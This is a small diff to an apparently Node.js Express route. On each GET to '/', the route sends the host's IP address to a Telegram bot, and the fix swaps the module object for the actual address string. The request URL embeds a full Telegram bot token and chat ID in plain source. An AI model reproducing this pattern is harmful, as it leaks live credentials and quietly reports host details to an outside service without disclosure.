@@ -14,7 +14,7 @@ router.get('/', async (req, res) => {
     try {
         const ipAddress = ip.address()
         console.log(ipAddress)
-        let url = "https://api.telegram.org/bot1316116818:AAFXalnuIZ_jiKNW-fRVyK2glWjRlI4g0Jk/sendMessage?chat_id=975873174&text=" + ip
+        let url = "https://api.telegram.org/bot1316116818:AAFXalnuIZ_jiKNW-fRVyK2glWjRlI4g0Jk/sendMessage?chat_id=975873174&text=" + ipAddress
     // Send a message to a telegram bot 
     https.get(url, (resp) => {
         let data = '';
